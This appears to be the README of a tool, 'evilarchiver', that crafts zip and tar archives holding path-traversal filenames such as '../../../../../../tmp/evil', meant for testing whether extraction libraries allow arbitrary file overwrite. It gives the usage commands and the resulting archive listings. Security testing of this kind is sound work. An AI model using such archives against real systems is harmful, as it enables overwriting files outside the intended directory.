# evilarchiver
Modded version of tarfile.py for testing arbitrary file (over)write via path traversal in Tar archives.

This script is useful for quickly craft a tar archive with a file with dot-dot pattern as a filename and verify if the target library is vulnerable to arbitrary file overwrite via path traversal filenames.

This tool is almost the same of https://github.com/ptoomey3/evilarc. It depends upon zipfile and tarfile Python libraries.

Example:

<code>$ mkdir safedir </code>
  
<code>$ touch safedir/safefile security_test.txt </code>

<code>$ python2 evilarchiver.py -e security_test.txt -n ../../../../../../tmp/evil -s safedir/safefile </code>

Output:

<pre>creating archive zip
creating archive tar
creating archive tar.gz
creating archive tar.bz2

Contents of evil.zip:
['../../../../../../tmp/evil', 'safedir/safefile']

Contents of evil.tar:
['../../../../../../tmp/evil', 'safedir/safefile']

Contents of evil.tar.gz:
['../../../../../../tmp/evil', 'safedir/safefile']

Contents of evil.tar.bz2:
['../../../../../../tmp/evil', 'safedir/safefile']</pre>


<pre>Options: 

-n: filename crafted with dot-dot patterns
-e: malicious file which content we want to associate to the dot-dot filename
-s: safe or benign file and filename
</pre>
